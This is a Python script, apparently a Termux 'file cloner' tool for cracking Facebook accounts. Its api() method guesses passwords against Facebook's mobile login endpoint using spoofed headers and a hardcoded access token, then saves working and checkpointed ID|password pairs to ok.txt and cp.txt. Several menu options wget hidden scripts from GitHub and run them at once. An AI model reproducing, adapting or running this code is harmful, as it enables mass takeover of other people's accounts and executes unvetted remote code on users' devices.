W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor


def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)



def helpnote():
	print("%s [*] FOLLOW ME ON Fb To KNOW ABOUT UPDATES  :)"%(G))
	subprocess.check_output(["am", "start", "https://raw.githubusercontent.com/EsanAhmedAbir/OldCrack/main/Premium.txt"])
	exit(" [*] TELEGRAM : https://t.me/EsanAhmedAbir ")


def notice():

##

	runtxt("\n\033[0;91m YOU ARE NOT PREMIUM USER ")
	runtxt("\033[0;93m SEND THIS KEY TO ADMIN FOR \033[0;96m FREE APPROVAL>> %s%s"%(G,basesplit))
	runtxt("\033[0;92m BYPASS ADMIN TELEGRAM >> https://t.me/EsanAhmedAbir")
	runtxt("\033[0;95m    <===================☠️  \033[0;97mEXIT\033[0;95m ☠️===================> ")
	subprocess.check_output(["am", "start", "https://t.me/EsanAhmedAbir"])


        
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')


class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/EsanAhmedAbir/OldCrack/main/Premium.txt').text
			if basesplit in plr:
				key = basesplit
				stat = ("\033[0;92mPREMIUM")
				FY = '\033[0;93m'
				FG = '\033[0;92m'
				GET = '\r'
			else:
				key = ("\033[0;91m -")
				stat = ("\033[0;91mFREE USER")
				FY = '\033[0;90m'
				FG = '\033[0;90m'
				GET = '\033[0;92m [P] GET PREMIUM'
		except requests.exceptions.ConnectionError:
			print("\n%s [!] NO INTERNET CONNECTION..\n"%(R))
			exit()
		os.system("clear")
		
##########Menuuu
		print("\n"+C+"░█████╗░██████╗░██╗██████╗░\n██╔══██╗██╔══██╗██║██╔══██╗ "+Y+"|Esan"+C+"\n███████║██████╦╝██║██████╔╝ "+Y+"|Ahmed"+C+"\n██╔══██║██╔══██╗██║██╔══██╗ "+Y+"|Abir"+C+"\n██║░░██║██████╦╝██║██║░░██║\n╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚═╝\n "+N+"──────────────────────────────────────────────────"+G+"\n▸ AUTHOR     : ESAN AHMED ABIR\n▸ FACEBOOK   : FACEBOOK.COM/Es4nAhm3dAb1r\n▸ YOUTUBE    : YOUTUBE.COM/AbirTheTechVhai\n▸ GITHUB     : GITHUB.COM/EsanAhmedAbir\n"+N+"─────────────────────────────────────────────────\n")
		print("%s [%s•%s] %sTOOL NAME : %sFile Cloner"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s1.0"%(G,R,G,B,G))
		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
		print("")
		runtxt("\033[97;1m    <=======   Every tool here is free, Enjoy   =======>")
		runtxt("\n    \033[0;95m <=======  𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐄𝐑  =======>  \033[0;97m ")
		print("%s [%s1%s]%s Make File %s(Public Dumping) "%(G,R,G,Y,B))
		print("%s [%s2%s]%s File Cloning.. %s(BXB )"%(G,R,G,Y,B))
		print("%s [%s3%s]%s File Cloning.. %s(JUKER )"%(G,R,G,Y,B))
		print("%s [%s4%s]%s Exit %s"%(G,R,G,Y,B))

		print("")
		
		
		abir = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
		if abir in ["", " "]:
			Main()
		elif abir in ["2", "02"]:
			if basesplit in plr:
			        self.bxb()
			else: 
				notice()
				exit()
		elif abir in ["1", "01"]:
			if basesplit in plr:
			        self.make()
			else: 
				notice()
				exit()

		elif abir in ["3", "03"]:
			if basesplit in plr:
			        self.gotov3()
			else: 
				notice()
				exit()

		elif abir in ["4", "04"]:
			if basesplit in plr:
			        self.gotov4()
			else: 
				notice()
				exit()


		else:
			Main()

##########make file
	def make(self):
		if	os.path.isfile('.makepy'):
			os.system("pkg install wget -y")
			os.system("pip install requests && pip install bs4 && clear && wget https://raw.githubusercontent.com/EsanAhmedAbir/MultiTool/main/.make.py && clear && python2 .make.py")

		else:
			os.system("pkg install wget -y")
			os.system("wget https://raw.githubusercontent.com/EsanAhmedAbir/MultiTool/main/.make.py && clear && python .make.py")


##########GoTOv2
	def bxb(self):
		if	os.path.isfile('.BXB.py'):
			os.system("pkg install wget -y")
			os.system("pip install requests && pip install bs4 && clear && wget https://raw.githubusercontent.com/EsanAhmedAbir/MultiTool/main/.BXB.py && clear && python .BXB.py")

		else:
			os.system("pkg install wget -y")
			os.system("wget https://raw.githubusercontent.com/EsanAhmedAbir/MultiTool/main/.BXB.py && clear && python .BXB.py")

			
##########GoTOv3
	def gotov3(self):
		if	os.path.isfile('JOKER.py'):
			os.system("pkg install wget -y")
			os.system("pip install requests && pip install bs4 && clear && rm -rf JUKER.PY && wget https://raw.githubusercontent.com/EsanAhmedAbir/MultiTool/main/.JOKER.py && clear && python .JOKER.py")
			
		else:
			os.system("pkg install wget -y")
			os.system("wget https://raw.githubusercontent.com/EsanAhmedAbir/MultiTool/main/.JOKER.py && clear && python .JOKER.py")

##########GoTOv4
	def gotov4(self):
		if	os.path.isfile('.br.py'):
			os.system("pkg install wget -y")
			os.system("pip install requests && pip install bs4 && clear && rm -rf .br.py && wget https://raw.githubusercontent.com/BotolMehedi/braje/main/.br.py && clear && python .br.py")
			
		else:
			print("")
			print("   \033[96;1m Thank you For using MultiTool")
			print(" ")
			print(" \033[95;1m ||=\033[96;1m Author   : Esan Ahmed Abir")
			print("  \033[95;1m||")
			print("  \033[95;1m||=\033[96;1m Telegram : @EsanAhmedAbir")
			print("  \033[95;1m||")
			print("  \033[95;1m||=\033[96;1m Github   : EsanAhmedAbir")
			print("  \033[95;1m")
			
			exit()

#######custom
	def custom(self):
		print("")



	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
		sys.stdout.write(
			"\r\r %s[>_] [BY] : %s/%s -> \033[0;92m [ BY-OK:%s ]- \033[0;91m[BY-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [BY-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [BY-CP] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print("   ___________________        \n  /  _____/\_   _____/        \n /   \  ___ |    __)          \n \    \_\  \|     \ \033[0;96mGALAXY\033[0;97m        \n  \______  /\___  /__\033[0;96mFACEBOOK\033[0;97m_\n         \/     \/_____/_____/")
		print("\n [*] Author    : Esan Ahmed Abir ")
		print(" [*] Team      :  \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://facebook.com/ ")
		print(" [*] Instagram : https://instagram.com/ ")
		print(" [*] YouTube   : https://youtube.com/ ")
		exit(" [*] GitHub    : https://github.com/ ")
	else:
		Main()

try:Main()
except Exception as e:exit(str(e))
